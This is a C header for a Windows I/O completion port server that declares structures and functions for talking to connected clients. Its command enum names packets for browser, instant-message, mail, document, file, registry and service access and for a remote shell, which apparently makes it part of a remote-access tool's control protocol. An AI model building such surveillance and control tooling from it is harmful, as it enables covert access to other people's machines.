#ifndef __NET_IO_COMPLETION_PORT_H__
#define __NET_IO_COMPLETION_PORT_H__

#define	NC_CLIENT_CONNECT		0x0001
#define	NC_CLIENT_DISCONNECT	0x0002
#define	NC_TRANSMIT				0x0003
#define	NC_RECEIVE				0x0004
#define NC_RECEIVE_COMPLETE		0x0005 // 完整接收


typedef enum _IO_TYPE 
{
    IoInitialize,
    IoRead,
    IoWrite,
    IoIdle
}IO_TYPE,*PIO_TYPE;

typedef enum _COMMAND_CODE
{
    PackVerification = 0x40000000,
    PackHeart,
    PackLogin,
    PackBrowser,
    PackInstantMsg,
    PackMail,
    PackDocument,
    PackFileManager,
    PackRegisterManager,
    PackServiceManager,
    PackRemoteShell
}COMMAND_CODE,*PCOMMAND_CODE;

typedef struct _COMMAND_PACKET
{
    PCHAR PacketHead[PACKET_NAME_LENGTH];
    ULONG ulPackCmdCode;
    ULONG ulPackSize;
}COMMAND_PACKET,*PCOMMAND_PACKET;
//typedef struct _DATA_PACKET
//{
//    COMMAND_PACKET CommandPacket;
//    PCHAR pPackDat;
//}DATA_PACKET,*PDATA_PACKET;

typedef struct _OVERLAPPEDPLUS
{
    OVERLAPPED OverLapped;
    IO_TYPE IoType;
}OVERLAPPEDPLUS,*POVERLAPPEDPLUS;

typedef struct _IO_COMPLETION_PORT_INFORMATION
{
    CHAR PacketName[11];
    HANDLE hCompletionPort;
    ULONG ulKeepLiveTime;
    ULONG ulMaxConnections;
    HANDLE hStopEvent;

    BOOLEAN bInitialize;
    BOOLEAN bDisconnectAll;
    BOOLEAN bAttachAll;
    BOOLEAN bOffline;
    CRITICAL_SECTION CriticalSection;

    SOCKET ListenSocket;
    WSAEVENT WsaEvent;
    SOCKADDR_IN ScokAddrServer;

    ULONG ulWorkCount;

    LONG lCurrentThreads;
    LONG lBusyThreads;

} IO_COMPLETION_PORT_INFORMATION,*PIO_COMPLETION_PORT_INFORMATION;


extern IO_COMPLETION_PORT_INFORMATION g_IoCompletionPortInformation;

BOOLEAN InitializeGlobalDat();
BOOLEAN InitializeIoCompletionPort();
BOOLEAN SendDatToClient(PCLIENT_CONTEXT pClientContext,PCHAR pSendDat,ULONG ulSendSize,COMMAND_CODE CmdCode,COMPRESSROUTINE CompressRoutine);
void CALLBACK NotifyProc(PVOID pParam,PCLIENT_CONTEXT pClientContext,ULONG ulCode);

#endif